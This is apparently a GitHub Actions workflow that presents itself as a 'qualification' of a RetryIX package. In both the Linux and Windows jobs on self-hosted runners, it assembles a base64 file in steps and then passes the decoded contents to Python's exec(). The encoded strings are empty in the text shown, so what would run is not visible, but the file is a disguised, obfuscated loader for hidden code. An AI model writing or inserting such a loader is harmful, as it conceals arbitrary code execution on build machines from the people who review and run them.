name: RetryIX Vulkan training qualification
on:
  push:
    branches: [studio-vulkan-retryix-20260921]
permissions: {}
jobs:
  linux:
    runs-on: [self-hosted, Linux, strix-halo, devlab-dispatch]
    timeout-minutes: 50
    steps:
      - name: Qualification source 1
        shell: bash
        run: |
          printf '%s' '' > "$RUNNER_TEMP/retryix-bootstrap.b64"
      - name: Qualification source 2
        shell: bash
        run: |
          printf '%s' '' >> "$RUNNER_TEMP/retryix-bootstrap.b64"
      - name: Qualify published RetryIX package
        shell: bash
        run: |
          python3 -c "import base64,os,pathlib; exec(base64.b64decode((pathlib.Path(os.environ['RUNNER_TEMP'])/'retryix-bootstrap.b64').read_text()))"
  windows:
    runs-on: [self-hosted, Windows, strix-halo, devlab-dispatch]
    timeout-minutes: 50
    steps:
      - name: Qualification source 1
        shell: powershell
        run: |
          '' | Set-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'retryix-bootstrap.b64')
      - name: Qualification source 2
        shell: powershell
        run: |
          '' | Add-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'retryix-bootstrap.b64')
      - name: Qualify published RetryIX package
        shell: powershell
        run: |
          python -c "import base64,os,pathlib; exec(base64.b64decode((pathlib.Path(os.environ['RUNNER_TEMP'])/'retryix-bootstrap.b64').read_text()))"
